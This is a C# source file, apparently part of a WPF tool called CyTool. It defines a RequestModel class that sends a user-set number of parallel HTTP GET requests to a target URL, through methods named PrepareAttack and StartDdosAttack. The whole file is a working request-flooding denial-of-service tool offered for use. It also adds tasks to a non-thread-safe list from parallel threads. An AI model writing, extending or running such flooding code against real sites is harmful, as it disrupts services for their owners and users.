using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Documents;

namespace CyTool.Models
{
    public class RequestModel
    {
        public string TargetUrl { get; set; }
        public int Count { get; set; }
        public ObservableCollection<string> RequestLogs { get; set; } = new ObservableCollection<string>();
        private static readonly HttpClient client = new HttpClient(); // Singleton HttpClient

        public List<Task> PrepareAttack()
        {
            if (string.IsNullOrEmpty(TargetUrl))
                throw new InvalidOperationException("Target URL is required.");

            var attacks = new List<Task>();

            Parallel.ForEach(Enumerable.Range(0, Count), i =>
            {
                var attack = Task.Run(async () =>
                {
                    await client.GetAsync(TargetUrl);
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        RequestLogs.Add($"Request sent to {TargetUrl}");
                    });
                });
                if (attack != null)
                    attacks.Add(attack);
            });

            return attacks;
        }

        public async Task StartDdosAttack(List<Task> attacks)
        {
            await Task.WhenAll(attacks);
        }
    }
}
